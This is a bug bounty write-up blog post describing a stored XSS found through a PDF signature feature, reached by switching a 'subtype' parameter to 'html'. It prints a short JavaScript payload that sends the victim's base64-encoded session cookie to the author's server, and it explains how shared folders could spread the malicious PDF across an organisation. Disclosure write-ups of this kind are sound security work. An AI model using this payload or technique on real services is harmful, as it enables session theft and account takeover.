---
layout: post
title:  "Infected signature in PDF document leads to mass account takeover"
tags: [web, hacking, realstory]
image: "/assets/img/malicious-pdf.jpg"
categories: [bugbounty]
---

This article is about a vulnerability that I discovered in a company that I unfortunately cannot name. This company offers a service where other companies can write and share documents online. The finaly impact made it possible for me to perform a mass account take over.


## The target feature

During my testing as a bug bounty hunter, I discovered a feature that allowed a user to add a customized digital hand-drawn signature. The signature could then later be added to PDF documents. When I first came across this feature, I had a question in mind. How can this feature record and visualize my hand drawing which is then generated into a signature?
I quickly came up with a theory and the only thing that was on my mind was SVG. This function must use some form of mouse movement tracking and then convert it to SVG code which later generates the digital signature. I analyzed my Burp Suite proxy history and discovered that my theory was actually correct. The signature had recorded my mouse movement on the client side and generated an SVG code. This code was then sent to the backend in a JSON POST request which allowed it to be stored presumably in a database relative to the current user I was logged in as.


## The vulnerability

For some time with the feature, my first goal was to trigger some kind of sign that the feature was vulnerable by trying to infect the SVG code to run JavaScript, which would result in a stored cross site scripting (XSS) within the PDF document. I couldn't run any JavaScript from the tests I did but instead my payloads made the editor crash. I started to ask myself how it was coded in the back-end and starting to make sense of the other parameters that was included in the JSON body. I hadn't noticed one important parameter named `subtype` parameter which had the value set to `svg`. I changed it to `html` and wrote a basic XSS payload, base64 encoded it and sent the HTTP request. I took the signature and added it to my PDF document in the editor and it fired. Great! Now we have a stored XSS vulnerability in the PDF document and it's time to move on to stage two - exploitation and impact.

## Exploitation

To exploit an XSS and really show the impact. You first need to check some basics such as : 

- Can our user session be read by JavaScript?
- Is our session or any key/token stored on a page?
- Is there any action we can do in our settings that can be done without entering our password?

Fortunately for me, all of these were true. The session of our logged in user was not using the HttpOnly flag which allows client-side JavaScript to read our session. I was able to simply create a JavaScript exploit code to hijack the session from the victim and send the session in base64 form to my own server.

### Payload
The payload (_exploit code_) I used is shown below:
```javascript
const brumens=document.createElement('img');
brumens.src=`https://myserver.com/${btoa(document.cookie)}`;
document.body.appendChild(brumens)"
```

Now that we had our malicious PDF document ready, we had to pass it in a clever way to our victim to avoid social engineering. The application I was hacking had one main feature that allowed companies to use its service and work as a team in shared folders with a very interesting behavior. If someone shared a resource (_document/folder_) with you, it would appear in your sidebar without you having to accept the shared resource. This will be a great way to send our malicious PDF document. I made a folder and added the PDF document to it, then shared it with the Victim (_My other test account_). As expected, the victim had the folder in the sidebar if the victim simply clicks on this shared PDF document in the folder I would have full control over their account as their session will be sent to my own server. Even more impactful is that I don't have to just share it to one person at a time. Instead, I could share my malicious folder to an entire organization or team and everyone who would click the PDF would give out their logged in sessions to me resulting in a mass account take over.